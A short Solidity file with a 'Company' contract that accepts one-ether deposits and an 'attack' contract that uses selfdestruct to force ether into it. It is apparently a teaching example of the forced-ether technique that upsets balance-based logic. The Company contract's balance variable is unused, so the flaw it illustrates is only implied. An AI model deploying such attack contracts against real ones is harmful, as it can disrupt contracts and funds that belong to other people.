pragma solidity ^0.8.4;


contract Company {

    function deposit() public payable {
        require(msg.value == 1 ether, "Send only one ether");
        uint balance = address(this).balance;
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract attack {

    Company company;

    constructor(Company _company) payable {
        company = Company(_company);
    }

    function attacks() public payable{
        address payable addr = payable(address(company));
        selfdestruct(addr);
    }
}
